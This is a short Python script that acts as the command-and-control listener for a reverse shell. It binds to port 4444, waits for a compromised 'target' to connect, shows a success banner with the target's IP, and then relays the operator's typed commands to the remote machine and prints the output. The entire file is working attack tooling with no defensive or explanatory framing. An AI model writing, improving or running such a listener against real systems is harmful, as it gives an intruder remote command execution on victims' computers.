# coding: utf-8
import socket

host = '127.0.0.1'
port = 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)

session, address = s.accept()
ip = session.recv(1024).decode('utf-8', errors="ignore")
print('Session créée en {}:{}'.format(address[0], address[1]))
print()
print()
print('[+]========================[+]')
print('[+]       Succes !         [+]')
print('[+]   You are connected !  [+]')
print('[+]========================[+]')
print('	target ip : '+ip)
print()
print()

session.send(b'shell')
print(session.recv(1024).decode('utf-8', errors="ignore"), end="")
while 1:
	shellc = str(input(''))
	if len(str(shellc)) > 0:
		if shellc == 'leave':
			session.send(shellc.encode("utf-8"))
			shl = False
		else:
			session.send(shellc.encode("utf-8"))
			client_response = session.recv(4096)
			print(client_response.decode('utf-8', errors="ignore"), end="")
	else:
		session.send(b'len0')
		client_response = session.recv(1024)
		print(client_response.decode('utf-8', errors="ignore"), end="")
